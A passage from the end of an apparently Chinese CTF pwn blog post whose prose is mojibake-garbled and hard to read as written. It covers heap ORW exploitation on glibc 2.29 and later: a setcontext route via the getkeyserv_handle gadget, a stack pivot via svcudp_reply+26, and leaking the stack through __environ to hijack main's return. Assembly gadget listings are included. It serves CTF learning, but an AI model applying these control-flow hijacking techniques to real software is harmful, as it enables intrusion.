<p>ç„¶åå…¶ä»–çš„æ–¹æ³•è¿˜æœ‰å¾…è‡ªå·±å­¦ä¹ ã€‚</p>
<p><strong>çœ‹ä¸€ç¯‡demo</strong></p>
<p><a target="_blank" rel="noopener" href="https://myenid.github.io/2021/05/19/VNCTF2021/">vnctf2021</a></p>
<h3 id="glibc-gt-2-29"><a href="#glibc-gt-2-29" class="headerlink" title="glibc&gt;2.29"></a>glibc&gt;2.29</h3><p>å½“åˆ°äº†é«˜ç‰ˆæœ¬libcä¹‹årdiå˜æˆäº†rdxï¼Œè€Œæ§åˆ¶rdxçš„gadgetå°‘çš„ä¸è¡Œï¼Œæ‰€ä»¥æä¾›ä¸€ä¸ªä¸‡èƒ½gadget</p>
<ul>
<li>ç¬¬ä¸€ç§setcontextçš„æ–¹æ³•</li>
</ul>
<p>è¿™å…¶ä¸­ç”¨åˆ°çš„ <code>gadget</code>æ˜¯ <code>getkeyserv_handle+576</code>ï¼Œå…¶æ±‡ç¼–å¦‚ä¸‹</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov     rdx, [rdi+8]
mov     [rsp+0C8h+var_C8], rax
call    qword ptr [rdx+20h]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>è¿™ä¸ª <code>gadget</code>å¯ä»¥é€šè¿‡ <code>rdi</code> æ¥æ§åˆ¶ <code>rdx</code>ï¼Œ éå¸¸å¥½ç”¨ï¼Œè€Œä¸”ä» Glibc2.29åˆ°2.32éƒ½å¯ç”¨</p>
<ul>
<li>ç¬¬äºŒç§ï¼Œæ ˆè¿ç§»</li>
</ul>
<p>åˆè¦æ§åˆ¶ <code>rdx</code>åˆè¦æ„é€  <code>setcontext</code>ï¼Œå¾ˆéº»çƒ¦ï¼Œåœ¨è¿™é‡Œä»‹ç»å¦ä¸€ç§è§£æ³•ï¼Œé€šè¿‡ gadgetæ§åˆ¶rbpçš„å€¼ï¼Œä»è€Œè¿›è¡Œæ ˆè¿ç§»ï¼Œå°†æ ˆåŠ«æŒåˆ°æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å †åœ°å€ä¸Šï¼Œå¹¶æ‰§è¡Œé¢„å…ˆå¸ƒç½®çš„ropé“¾ï¼Œä»è€Œè·å–flag</p>
<p>å…ˆä»‹ç»ä¸€ä¸‹ä¸‡é‡‘æ²¹çš„gadget <code>svcudp_reply+26</code>ï¼Œæ±‡ç¼–å¦‚ä¸‹</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov rbp, qword ptr [rdi + 0x48]; 
mov rax, qword ptr [rbp + 0x18]; 
lea r13, [rbp + 0x10]; 
mov dword ptr [rbp + 0x10], 0; 
mov rdi, r13; 
call qword ptr [rax + 0x28];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™ä¸ªgadgetsä¸»è¦æ˜¯é€šè¿‡ <code>rdi</code>æ§åˆ¶ <code>rbp</code>è¿›è€Œæ§åˆ¶ <code>rax</code>å¹¶æ‰§è¡Œè·³è½¬ï¼Œç”±äºæˆ‘ä»¬å·²ç»æ§åˆ¶äº† <code>rbp</code>çš„å€¼ï¼Œå› æ­¤åªéœ€è¦åœ¨ <code>rax+0x28</code>çš„ä½ç½®éƒ¨ç½² <code>leaveï¼›ret</code>å³å¯å®Œæˆæ ˆè¿ç§»</p>
<p>ä»è€Œåœ¨æˆ‘ä»¬å·²ç»å¸ƒç½®å¥½ <code>orw ropé“¾</code>çš„ä½ç½®ä¼ªé€ æ ˆåœ°å€å¹¶åŠ«æŒæ§åˆ¶æµï¼Œæœ€ç»ˆè¯»å–<code>flag</code></p>
<ul>
<li>ç¬¬ä¸‰ç§ï¼Œç¯å¢ƒå˜é‡æ‰“mainå‡½æ•°çš„è¿”å›åœ°å€</li>
</ul>
<p>è¿™ç§æ–¹æ³•å›½èµ›æœ‰å¸ˆå‚…ç”¨åˆ°äº†ï¼Œå†™åœ¨äº†æˆ‘çš„å›½èµ›WPä¸Šã€‚</p>
<p>å¦‚æœ <code>æ ˆåœ°å€</code>å·²çŸ¥çš„è¯ï¼Œè§£é¢˜è¿‡ç¨‹ä¼šæ›´åŠ ç®€å•ï¼Œè€Œä¸”ä¸éœ€è¦ç‰¹æ„å»å¯»æ‰¾ä¸‡é‡‘æ²¹çš„gadgets</p>
<p>é‚£ä¹ˆå¦‚ä½•æ³„éœ²<code>æ ˆåœ°å€</code>å‘¢ï¼Ÿ</p>
<p>å…¶å®ç¨‹åºçš„æ ˆåœ°å€ä¼šå­˜æ”¾åœ¨ <code>__environ</code>ä¸­ï¼Œæˆ‘ä»¬åªè¦è¾“å‡º<code>__environ</code>çš„å†…å®¹å°±èƒ½è·å–æ ˆåœ°å€</p>
<p>åœ¨è·å–åˆ°æ ˆåœ°å€åï¼Œæˆ‘åœ¨mainå‡½æ•°çš„ <code>ret</code>å¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œå‘ç°mainå‡½æ•°è¿”å›å€¼å’Œæˆ‘ä»¬æ³„éœ²çš„æ ˆåœ°å€æ­£å¥½ç›¸å·® <strong>xxx</strong>è¿™ä¸ªåç§»è¦è‡ªå·±å»ç®—ï¼Œåå¤éªŒè¯ï¼Œåå¤è®¡ç®—ã€‚ç¨å¾®é”™ä¸€ç‚¹éƒ½ä¸å¯ä»¥ã€‚</p>
<p>è‡³æ­¤ï¼Œå †ä¸Šçš„orwåŸºæœ¬å°±è¿™äº›å§¿åŠ¿äº†ã€‚è¿˜æ˜¯å¼ºè°ƒï¼Œæ‰‹æ³•ï¼Œç™¾æ— ç¦å¿Œ</p>
</div><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>Ev3r</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="http://example.com/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/" title="å †çŸ¥è¯†--æŒç»­">http://example.com/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-Ev3r/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-EV3R 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-Ev3r-line"></use></svg></a> è®¸å¯åè®®ã€‚</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/05/13/HITCON-Trainging-heapcreator/" rel="prev" title="HITCON Trainging heapcreator"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">HITCON Trainging heapcreator</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/05/10/%E8%BF%90%E8%A1%8C%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/" rel="next" title="è¿è¡Œä¸åŒç‰ˆæœ¬libc"><span class="post-nav-text">è¿è¡Œä¸åŒç‰ˆæœ¬libc</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>å¦‚æœæ‚¨æœ‰ä»»ä½•å…³äºåšå®¢å†…å®¹çš„ç›¸å…³è®¨è®ºï¼Œæ¬¢è¿å‰å¾€ <a href="https://github.com/YunYouJun/yunyoujun.github.io/discussions" target="_blank">GitHub Discussions</a> ä¸æˆ‘äº¤æµã€‚</span><br></div><div id="waline"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js", () => {
  const walineConfig = {"enable":true,"serverURL":"https://waline.yunyoujun.cn","comment":true,"visitor":true,"avatarCDN":"https://cdn.v2ex.com/gravatar/","placeholder":"å¡«å†™é‚®ç®±ï¼Œå¯ä»¥æ”¶åˆ°å›å¤é€šçŸ¥å“¦ï½","requiredFields":["nick"],"el":"#waline","lang":"zh-CN"}
  walineConfig.path = "/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/"
  new Waline(walineConfig)
}, window.Waline);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">è¿™é‡Œæ˜¯</a></div><div class="copyright"><span>&copy; 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Ev3r</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v5.4.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.2</span></div><div class="live_time"><span>æœ¬åšå®¢å·²è¯ç”Ÿ</span><span id="display_live_time"></span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2021-03-10T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " å¤© " + passHour + " å°æ—¶ " + passMinute + " åˆ† " + passSecond + " ç§’";
}
blog_live_time();
</script></div><div class="footer-custom-text">pwnèœé¸¡</a></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script>const date = new Date();
const today = (date.getMonth() + 1) + "-" + date.getDate()
const mourn_days = ["4-4"]
if (mourn_days.includes(today)) {
  document.documentElement.style.filter = "grayscale(1)";
}</script></div></body></html>